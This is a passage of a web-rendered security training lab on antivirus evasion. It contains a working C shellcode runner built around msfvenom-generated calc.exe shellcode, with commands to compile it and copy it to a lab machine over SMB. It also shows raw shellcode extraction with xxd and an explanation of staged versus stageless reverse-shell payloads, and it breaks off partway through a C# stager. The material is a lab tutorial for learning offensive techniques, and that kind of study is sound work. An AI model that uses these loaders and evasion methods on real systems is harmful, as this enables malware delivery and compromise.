style="color:#e3116c">&quot;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        DWORD oldProtect</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">VirtualProtect</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">stager</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">sizeof</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">stager</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> PAGE_EXECUTE_READ</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">oldProtect</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token plain">shellcode</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">void</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">stager</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">shellcode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p>Now let&#x27;s compile it as an exe file:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Compile our C program for Windows</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ i686-w64-mingw32-gcc calc.c </span><span class="token parameter variable" style="color:#36acaa">-o</span><span class="token plain"> calc-MSF.exe</span><br></span></code></pre></div></div>
<p>Once we have our exe file, let&#x27;s transfer it to the Windows machine and execute it. To transfer the file you can use smbclient from your AttackBox to access the SMB share at <code>\\MACHINE_IP\Tools</code> with the following commands (remember the password for the <code>thm</code> user is <code>Password321</code>):</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Copy calc-MSC.exe to Windows Machine</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ smbclient </span><span class="token parameter variable" style="color:#36acaa">-U</span><span class="token plain"> thm </span><span class="token string" style="color:#e3116c">&#x27;//10.82.134.191/Tools&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">smb: </span><span class="token punctuation" style="color:#393A34">\</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> put calc-MSF.exe</span><br></span></code></pre></div></div>
<p>This should copy your file in <code>C:\Tools\</code> in the Windows machine.</p>
<p>While your machine&#x27;s AV should be disabled, feel free to try and upload your payload to the THM Antivirus Check at <code>http://MACHINE_IP/</code>.</p>
<p><img decoding="async" loading="lazy" alt="Executing MSF Payload to run calc.exe" src="/TryHackMe-CN/en/assets/images/image_20251136-223631-e57b4eebf3b2c656c949107a086f6c98.png" width="1240" height="599" class="img_ev3q"></p>
<p>The Metasploit framework has many other shellcode formats and types for all your needs. We strongly suggest experimenting more with it and expanding your knowledge by generating different shellcodes.</p>
<p>The previous example shows how to generate shellcode and execute it within a target machine. Of course, you can replicate the same steps to create different types of shellcode, for example, the Meterpreter shellcode.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="generate-shellcode-from-exe-files">Generate Shellcode from EXE files<a href="#generate-shellcode-from-exe-files" class="hash-link" aria-label="Direct link to Generate Shellcode from EXE files" title="Direct link to Generate Shellcode from EXE files" translate="no">​</a></h3>
<p>Shellcode can also be stored in <code>.bin</code> files, which is a raw data format. In this case, we can get the shellcode of it using the <code>xxd -i</code> command.</p>
<p>C2 Frameworks provide shellcode as a raw binary file <code>.bin</code>. If this is the case, we can use the Linux system command <code>xxd</code> to get the hex representation of the binary file. To do so, we execute the following command: <code>xxd -i</code>.</p>
<p>Let&#x27;s create a raw binary file using msfvenom to get the shellcode:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Generate a Raw shellcode to Execute calc.exe</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ msfvenom </span><span class="token parameter variable" style="color:#36acaa">-a</span><span class="token plain"> x86 </span><span class="token parameter variable" style="color:#36acaa">--platform</span><span class="token plain"> windows </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> windows/exec </span><span class="token assign-left variable" style="color:#36acaa">cmd</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">calc.exe </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> raw </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> /tmp/example.bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">No encoder specified, outputting raw payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Payload size: </span><span class="token number" style="color:#36acaa">193</span><span class="token plain"> bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ </span><span class="token function" style="color:#d73a49">file</span><span class="token plain"> /tmp/example.bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/tmp/example.bin: data</span><br></span></code></pre></div></div>
<p>And run the <code>xxd</code> command on the created file:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Get the shellcode using the xxd command</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ xxd </span><span class="token parameter variable" style="color:#36acaa">-i</span><span class="token plain"> /tmp/example.bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">unsigned char _tmp_example_bin</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x8b, 0x50, 0x30, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf2, 0x52, 0x57, 0x8b, 0x52,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 0xe3, 0x48, 0x01, 0xd1,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3, 0x3a, 0x49,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x8b, 0x34, 0x8b, 0x01, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0xc7, 0x38, 0xe0, 0x75, 0xf6, 0x03, 0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0xe4, 0x58, 0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b, 0x0c, 0x4b, 0x8b,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x5f, 0x5f, 0x5a,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x8b, 0x12, 0xeb, 0x8d, 0x5d, 0x6a, 0x01, 0x8d, 0x85, 0xb2, 0x00, 0x00,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x00, 0x50, 0x68, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0xa2, 0x56, 0x68, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x3c, 0x06, 0x7c,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x00, 0x53, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">unsigned int _tmp_example_bin_len </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">193</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>If we compare the output with the previous shellcode created with Metasploit, it matches.</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Apply what we discussed in this task and get ready for the next topic! </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">No answer needed</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="task-6-staged-payloads">Task 6 Staged Payloads<a href="#task-6-staged-payloads" class="hash-link" aria-label="Direct link to Task 6 Staged Payloads" title="Direct link to Task 6 Staged Payloads" translate="no">​</a></h2>
<p>In our goal to bypass the AV, we will find two main approaches to delivering the final shellcode to a victim. Depending on the method, you will find payloads are usually categorized as <strong>staged</strong> or <strong>stageless</strong> payloads. In this task, we will look at the differences in both approaches and the advantages of each method.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="stageless-payloads">Stageless Payloads<a href="#stageless-payloads" class="hash-link" aria-label="Direct link to Stageless Payloads" title="Direct link to Stageless Payloads" translate="no">​</a></h3>
<p>A stageless payload embeds the final shellcode directly into itself. Think of it as a packaged app that executes the shellcode in a single-step process. In previous tasks, we embedded an executable that embedded a simple <code>calc</code> shellcode, making a stageless payload.</p>
<p><img decoding="async" loading="lazy" alt="Stageless Payload" src="/TryHackMe-CN/en/assets/images/image_20251149-204902-6d6c86a41fb1286540508ee0dd221a4f.png" width="1386" height="364" class="img_ev3q"></p>
<p>In the example above, when the user executes the malicious payload, the embedded shellcode will run, providing a reverse shell to the attacker.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="staged-payloads">Staged Payloads<a href="#staged-payloads" class="hash-link" aria-label="Direct link to Staged Payloads" title="Direct link to Staged Payloads" translate="no">​</a></h3>
<p>Staged payloads work by using intermediary shellcodes that act as steps leading to the execution of a final shellcode. Each of these intermediary shellcodes is known as a <strong>stager</strong>, and its primary goal is to provide a means to retrieve the final shellcode and execute it eventually.</p>
<p>While there might be payloads with several stages, the usual case involves having a two-stage payload where the first stage, which we&#x27;ll call <strong>stage0</strong>, is a stub shellcode that will connect back to the attacker&#x27;s machine to download the final shellcode to be executed.</p>
<p><img decoding="async" loading="lazy" alt="Staged Payload - stage0" src="/TryHackMe-CN/en/assets/images/image_20251149-204920-5962a6b7f0ae8c5bc07dd0b0cd13f150.png" width="1386" height="364" class="img_ev3q"></p>
<p>Once retrieved, the stage0 stub will inject the final shellcode somewhere in the memory of the payload&#x27;s process and execute it (as shown below).</p>
<p><img decoding="async" loading="lazy" alt="Staged Payload - Send ReveseShell" src="/TryHackMe-CN/en/assets/images/image_20251149-204935-1395e4ae7dc4891e997fd97ed8d1f65f.png" width="1386" height="370" class="img_ev3q"></p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="staged-vs-stageless">Staged vs. Stageless<a href="#staged-vs-stageless" class="hash-link" aria-label="Direct link to Staged vs. Stageless" title="Direct link to Staged vs. Stageless" translate="no">​</a></h3>
<p>When deciding which type of payload to use, we must be aware of the environment we&#x27;ll be attacking. Each payload type has advantages and disadvantages depending on the specific attack scenario.</p>
<p>In the case of stageless payloads, you will find the following advantages:</p>
<ul>
<li class="">The resulting executable packs all that is needed to get our shellcode working.</li>
<li class="">The payload will execute without requiring additional network connections. The fewer the network interactions, the lesser your chances of being detected by an IPS.</li>
<li class="">If you are attacking a host with very restricted network connectivity, you may want your whole payload to be in a single package.</li>
</ul>
<p>For staged payloads, you will have:</p>
<ul>
<li class="">Small footprint on disk. Since stage0 is only in charge of downloading the final shellcode, it will most likely be small in size.</li>
<li class="">The final shellcode isn&#x27;t embedded into the executable. If your payload is captured, the Blue Team will only have access to the stage0 stub and nothing more.</li>
<li class="">The final shellcode is loaded in memory and never touches the disk. This makes it less prone to be detected by AV solutions.</li>
<li class="">You can reuse the same stage0 dropper for many shellcodes, as you can simply replace the final shellcode that gets served to the victim machine.</li>
</ul>
<p>In conclusion, we can&#x27;t say that either type is better than the other unless we add some context to it. In general, stageless payloads are better suited for networks with lots of perimeter security, as it doesn&#x27;t rely on having to download the final shellcode from the Internet. If, for example, you are performing a USB Drop Attack to target computers in a closed network environment where you know you won&#x27;t get a connection back to your machine, stageless is the way to go.</p>
<p>Staged payloads, on the other hand, are great when you want your footprint on the local machine to be reduced to a minimum. Since they execute the final payload in memory, some AV solutions might find it harder to detect them. They are also great for avoiding exposing your shellcodes (which usually take considerable time to prepare), as the shellcode isn&#x27;t dropped into the victim&#x27;s disk at any point (as an artifact).</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="stagers-in-metasploit">Stagers in Metasploit<a href="#stagers-in-metasploit" class="hash-link" aria-label="Direct link to Stagers in Metasploit" title="Direct link to Stagers in Metasploit" translate="no">​</a></h3>
<p>When creating payloads with msfvenom or using them directly in Metasploit, you can choose to use either staged or stageless payloads. As an example, if you want to generate a reverse TCP shell, you will find two payloads exist for that purpose with slightly different names (notice the <code>_</code> versus <code>/</code> after <code>shell</code>):</p>
<table><thead><tr><th style="text-align:left">Payload</th><th style="text-align:left">Type</th></tr></thead><tbody><tr><td style="text-align:left">windows/x64/shell_reverse_tcp</td><td style="text-align:left">Stageless payload</td></tr><tr><td style="text-align:left">windows/x64/shell/reverse_tcp</td><td style="text-align:left">Staged payload</td></tr></tbody></table>
<p>You will generally find that the same name patterns are applied to other types of shells. To use a stageless Meterpreter, for example, we would use the <code>windows/x64/meterpreter_reverse_tcp</code>, rather than <code>windows/x64/meterpreter/reverse_tcp</code>, which works as its staged counterpart.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="creating-your-own-stager">Creating Your Own Stager<a href="#creating-your-own-stager" class="hash-link" aria-label="Direct link to Creating Your Own Stager" title="Direct link to Creating Your Own Stager" translate="no">​</a></h3>
<p>To create a staged payload, we will use a slightly modified version of the stager code provided by <a href="https://github.com/mvelazc0/defcon27_csharp_workshop/blob/master/Labs/lab2/2.cs" target="_blank" rel="noopener noreferrer" class="">@mvelazc0</a>. The full code of our stager can be obtained here, but is also available in your Windows machine at <code>C:\Tools\CS Files\StagedPayload.cs</code>:</p>
<details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> ClFull Payload Code (Click to read) </summary><div><div class="collapsibleContent_i85q"><div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Net</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Text</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Configuration</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Install</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Runtime</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">InteropServices</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Security</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Cryptography</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">X509Certificates</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">public</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">class</span><span class="token plain"> </span><span class="token class-name">Program</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">//https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc </span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">[</span><span class="token function" style="color:#d73a49">DllImport</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;kernel32&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">extern</span><span class="token plain"> </span><span class="token return-type class-name">UInt32</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">VirtualAlloc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name">UInt32</span><span class="token plain"> lpStartAddr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> size</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> flAllocationType</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> flProtect</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">//https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">[</span><span class="token function" style="color:#d73a49">DllImport</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;kernel32&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">extern</span><span class="token plain"> </span><span class="token return-type class-name">IntPtr</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">CreateThread</span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name">UInt32</span><span class="token plain"> lpThreadAttributes</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> dwStackSize</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> lpStartAddress</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">IntPtr</span><span class="token plain"> param</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> dwCreationFlags</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">ref</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> lpThreadId</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">//https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">[</span><span class="token function" style="color:#d73a49">DllImport</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;kernel32&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">extern</span><span class="token plain"> </span><span class="token return-type class-name">UInt32</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">WaitForSingleObject</span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name">IntPtr</span><span class="token plain"> hHandle</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> dwMilliseconds</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span 